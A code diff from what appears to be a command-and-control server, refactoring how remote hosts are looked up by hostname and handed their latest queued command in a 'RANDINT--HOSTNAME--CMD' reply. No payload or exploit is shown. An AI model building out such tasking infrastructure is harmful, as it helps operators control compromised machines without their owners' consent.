@@ -106,16 +106,6 @@ def testdb():
 # APP-RELATED FUNCTIONS
 # ===============================================
 
-# get hosts by hostname
-# ===============================================
-def get_one_host(conn, hostname):
-# def get_one_host(conn, hostname, hash):
-	sql = 'SELECT * FROM hosts WHERE hostname = ?'
-	# sql = 'SELECT * FROM hosts WHERE hostname = ? AND hash = ?'
-	results = db.select_db(conn, sql, (hostname,))
-
-	return results
-# ===============================================
 
 # insert new host
 # ===============================================
@@ -124,16 +114,6 @@ def insert_host(conn, hostname, ip):
 	lastrowid = db.insert_db(conn, sql, (hostname, ip, md5((hostname+ip).encode('utf-8')).hexdigest()))
 
 	return lastrowid
-# ===============================================
-
-
-# get latest cmd by host hash
-# ===============================================
-def get_last_cmd_for_host(conn, hash):
-	sql = 'SELECT command FROM commands WHERE host_hash = ?'
-	command = db.select_db(conn, sql, (hash,))
-
-	return command
 # ===============================================
 
 
@@ -162,9 +142,10 @@ def phase1():
 
 
 	# check if hostname exists in db
-	is_host_registered = get_one_host(conn, hostname)
+	# sample : [[1, 'DESKTOP-AB123', 'bc60fa448aab00f893d746b9190e2ae0', 'windows', '127.0.0.1']]
+	host = (db.get_one_host(hostname)).get_json()
 
-	if len(is_host_registered) != 0:
+	if host:
 		print("host already here")
 	else:
 		print("[!] no host %s registered !" % (hostname))
@@ -174,13 +155,18 @@ def phase1():
 
 
 	# check if command to give to host
-	host_hash = md5((hostname+ip).encode('utf-8')).hexdigest()
-	latest_cmd_for_host = get_last_cmd_for_host(host_hash)
-	print(latest_cmd_for_host)
+	# host_hash = md5((hostname+ip).encode('utf-8')).hexdigest()
 
+	latest_cmd_for_host = (db.get_last_cmd_for_host(hostname)).get_json()
+	
+	# return_txt = ""
+
+	# for cmd in latest_cmd_for_host:
+	# 	return_txt += cmd[0]+"\n"
 
 	# return "<RANDINT>--<HOSTNAME>--<CMD>"
-	return "123--%s--%s" % (hostname, latest_cmd)
+	return "123--%s--%s" % (hostname, latest_cmd_for_host[0][0])
+	# return "123--%s--%s" % (hostname, return_txt)
 # ===============================================
 
 
